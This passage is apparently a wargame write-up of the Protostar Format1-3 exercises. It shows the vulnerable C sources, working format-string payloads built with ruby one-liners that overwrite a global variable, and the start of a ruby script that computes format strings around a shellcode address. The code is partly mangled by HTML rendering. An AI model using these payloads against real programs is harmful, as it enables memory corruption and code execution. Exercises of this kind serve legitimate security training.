</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">target</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">you</span> <span class="n">have</span> <span class="n">modified</span> <span class="n">the</span> <span class="nl">target</span> <span class="p">:)</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We want to write something to global variable <code>target</code>, stored in <code>bss</code> section. It has fixed address:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ objdump -t /opt/protostar/bin/format1 | grep target
</span><span class='line'>08049638 g     O .bss   00000004              target&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ nm /opt/protostar/bin/format1 | grep target
</span><span class='line'>08049638 B target</span></code></pre></td></tr></table></div></figure></p>

<p>To find the <code>DDDD = 0x44444444</code> on the stack, after a few tries we have:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print "DDDD&rdquo; + &ldquo; %p&rdquo; * 200&rsquo;)&ldquo;
</span><span class='line'>DDDD 0x804960c 0xbffff528 0x8048469 0xb7fd8304 0xb7fd7ff4 0xbffff528 0x8048435 0xbffff718 0xb7ff1040 0x804845b 0xb7fd7ff4 0x8048450 (nil) 0xbffff5a8 0xb7eadc76 0x2 0xbffff5d4 0xbffff5e0 0xb7fe1848 0xbffff590 0xffffffff 0xb7ffeff4 0x804824d 0x1 0xbffff590 0xb7ff0626 0xb7fffab0 0xb7fe1b28 0xb7fd7ff4 (nil) (nil) 0xbffff5a8 0xcec48558 0xe4969348 (nil) (nil) (nil) 0x2 0x8048340 (nil) 0xb7ff6210 0xb7eadb9b 0xb7ffeff4 0x2 0x8048340 (nil) 0x8048361 0x804841c 0x2 0xbffff5d4 0x8048450 0x8048440 0xb7ff1040 0xbffff5cc 0xb7fff8f8 0x2 0xbffff6fd 0xbffff718 (nil) 0xbffff975 0xbffff983 0xbffff997 0xbffff9b8 0xbffff9cb 0xbffff9de 0xbffff9e8 0xbffffed8 0xbfffff16 0xbfffff2a 0xbfffff39 0xbfffff4a 0xbfffff52 0xbfffff62 0xbfffff6f 0xbfffffa3 0xbfffffb2 0xbfffffcf (nil) 0x20 0xb7fe2414 0x21 0xb7fe2000 0x10 0xfabfbff 0x6 0x1000 0x11 0x64 0x3 0x8048034 0x4 0x20 0x5 0x7 0x7 0xb7fe3000 0x8 (nil) 0x9 0x8048340 0xb 0x3e9 0xc (nil) 0xd 0x3e9 0xe 0x3e9 0x17 0x1 0x19 0xbffff6db 0x1f 0xbfffffe1 0xf 0xbffff6eb (nil) (nil) (nil) (nil) (nil) 0xd4000000 0x72facad1 0x50139897 0x39f1f921 0x695501e9 0x363836 (nil) (nil) (nil) 0x706f2f00 0x72702f74 0x736f746f 0x2f726174 0x2f6e6962 0x6d726f66 0x317461 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print "DDDD&rdquo; + &ldquo; %p&rdquo; * 140&rsquo;)&ldquo;
</span><span class='line'>DDDD 0x804960c 0xbffff5e8 0x8048469 0xb7fd8304 0xb7fd7ff4 0xbffff5e8 0x8048435 0xbffff7cc 0xb7ff1040 0x804845b 0xb7fd7ff4 0x8048450 (nil) 0xbffff668 0xb7eadc76 0x2 0xbffff694 0xbffff6a0 0xb7fe1848 0xbffff650 0xffffffff 0xb7ffeff4 0x804824d 0x1 0xbffff650 0xb7ff0626 0xb7fffab0 0xb7fe1b28 0xb7fd7ff4 (nil) (nil) 0xbffff668 0x9cacbe0e 0xb6ff281e (nil) (nil) (nil) 0x2 0x8048340 (nil) 0xb7ff6210 0xb7eadb9b 0xb7ffeff4 0x2 0x8048340 (nil) 0x8048361 0x804841c 0x2 0xbffff694 0x8048450 0x8048440 0xb7ff1040 0xbffff68c 0xb7fff8f8 0x2 0xbffff7b1 0xbffff7cc (nil) 0xbffff975 0xbffff983 0xbffff997 0xbffff9b8 0xbffff9cb 0xbffff9de 0xbffff9e8 0xbffffed8 0xbfffff16 0xbfffff2a 0xbfffff39 0xbfffff4a 0xbfffff52 0xbfffff62 0xbfffff6f 0xbfffffa3 0xbfffffb2 0xbfffffcf (nil) 0x20 0xb7fe2414 0x21 0xb7fe2000 0x10 0xfabfbff 0x6 0x1000 0x11 0x64 0x3 0x8048034 0x4 0x20 0x5 0x7 0x7 0xb7fe3000 0x8 (nil) 0x9 0x8048340 0xb 0x3e9 0xc (nil) 0xd 0x3e9 0xe 0x3e9 0x17 0x1 0x19 0xbffff79b 0x1f 0xbfffffe1 0xf 0xbffff7ab (nil) (nil) (nil) (nil) (nil) 0xd3000000 0xaf79b817 0x53b8b1a3 0x6ce5252 0x69b1ee44 0x363836 0x706f2f00 0x72702f74 0x736f746f 0x2f726174 0x2f6e6962 0x6d726f66 0x317461 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;DDDD %140\$x&rdquo;
</span><span class='line'>DDDD 78243034&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;DDDD %139\$x&rdquo;
</span><span class='line'>DDDD 31252044&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;DDDD %138\$x&rdquo;
</span><span class='line'>DDDD 44444400&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;DDDD  %138\$x&rdquo;
</span><span class='line'>DDDD  44444444&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print "DDDD  %138\$x&rdquo;&rsquo;)&ldquo;
</span><span class='line'>DDDD  44444444&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print [0x44444444].pack("V&rdquo;) + &ldquo;  %138\$x&rdquo;&rsquo;)&ldquo;
</span><span class='line'>DDDD  44444444&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print [0x08049638].pack("V&rdquo;) + &ldquo;  %138\$x&rdquo;&rsquo;)&ldquo;
</span><span class='line'>8  8049638&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ /opt/protostar/bin/format1 &ldquo;$(ruby -e &lsquo;print [0x08049638].pack("V&rdquo;) + &ldquo;  %138\$n&rdquo;&rsquo;)&ldquo;
</span><span class='line'>8  you have modified the target :)</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Format2</h2>

<p><figure class='code'><figcaption><span>format2.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">target</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">vuln</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mi">64</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">you</span> <span class="n">have</span> <span class="n">modified</span> <span class="n">the</span> <span class="nl">target</span> <span class="p">:)</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">target</span> <span class="n">is</span> <span class="o">%</span><span class="nl">d</span> <span class="p">:(</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">target</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">vuln</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD&rdquo; + &ldquo; %p&rdquo; * 10&rsquo; | /opt/protostar/bin/format2
</span><span class='line'>DDDD 0x200 0xb7fd8420 0xbffff5d4 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070target is 0 :(&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD %4\$p&rdquo;&rsquo; | /opt/protostar/bin/format2
</span><span class='line'>DDDD 0x44444444target is 0 :(&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ nm /opt/protostar/bin/format2 | grep target
</span><span class='line'>080496e4 B target&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$p&rdquo;&rsquo; | /opt/protostar/bin/format2
</span><span class='line'> 0x80496e4target is 0 :(&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$n&rdquo;&rsquo; | /opt/protostar/bin/format2
</span><span class='line'> target is 5 :(&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$x %4\$n&rdquo;&rsquo; | /opt/protostar/bin/format2
</span><span class='line'> 80496e4 target is 13 :(&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$61x %4\$n&rdquo;&rsquo; | /opt/protostar/bin/format2
</span><span class='line'>                                                       80496e4 target is 67 :(&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ ruby -e &lsquo;print [0x080496e4].pack(&ldquo;V&rdquo;) + &ldquo; %4\$58x %4\$n&rdquo;&rsquo; | /opt/protostar/bin/format2
</span><span class='line'>                                                    80496e4 you have modified the target :)</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Format3</h2>

<p><figure class='code'><figcaption><span>format3.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">target</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">printbuffer</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">vuln</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printbuffer</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">target</span> <span class="o">==</span> <span class="mh">0x01025544</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">you</span> <span class="n">have</span> <span class="n">modified</span> <span class="n">the</span> <span class="nl">target</span> <span class="p">:)</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">target</span> <span class="n">is</span> <span class="o">%</span><span class="mi">08</span><span class="nl">x</span> <span class="p">:(</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">target</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">vuln</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD&rdquo; + &ldquo; %p&rdquo; * 25&rsquo; | /opt/protostar/bin/format3
</span><span class='line'>DDDD (nil) 0xbffff590 0xb7fd7ff4 (nil) (nil) 0xbffff798 0x804849d 0xbffff590 0x200 0xb7fd8420 0xbffff5d4 0x44444444 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520target is 00000000 :(&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ ruby -e &lsquo;print &ldquo;DDDD %12\$p&rdquo;&rsquo; | /opt/protostar/bin/format3
</span><span class='line'>DDDD 0x44444444target is 00000000 :(&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ nm /opt/protostar/bin/format3 | grep target
</span><span class='line'>080496f4 B target</span></code></pre></td></tr></table></div></figure></p>

<p>We need to rewrite the address at <code>0x080496f4</code> with the value <code>0x01025544</code>. For this purpose we prepare simple ruby script to calculate the exact format string:</p>

<p><figure class='code'><figcaption><span>formatter.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;!/us</span><span class="n">r</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">ruby</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;def check_param(fmt)</span>
</span><span class='line'><span class="sr">    return if fmt =~ /</span><span class="p">\</span><span class="n">d</span><span class="o">+</span><span class="p">:</span><span class="mi">0</span><span class="n">x</span><span class="p">\</span><span class="n">h</span><span class="o">+</span><span class="p">:</span><span class="mi">0</span><span class="n">x</span><span class="p">\</span><span class="n">h</span><span class="o">+/</span>
</span><span class='line'>    <span class="nb">puts</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="ss">syntax</span><span class="p">:</span> <span class="c1">#{$0} &amp;lt;position:target_address:shellcode_address&gt;&amp;rdquo;</span>
</span><span class='line'>    <span class="nb">exit</span>
</span><span class='line'><span class="k">end</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;fmt = ARGV[0]</span>
</span><span class='line'><span class="sr">check_param(fmt)&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">offset</span><span class="p">,</span> <span class="n">target_addr</span><span class="p">,</span> <span class="n">shellcode_addr</span> <span class="o">=</span> <span class="n">fmt</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="ss">:&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;get high /</span> <span class="n">low</span> <span class="n">ordered</span> <span class="n">bytes</span><span class="p">,</span> <span class="n">remove</span> <span class="mi">0</span><span class="n">x</span> <span class="n">prefix</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
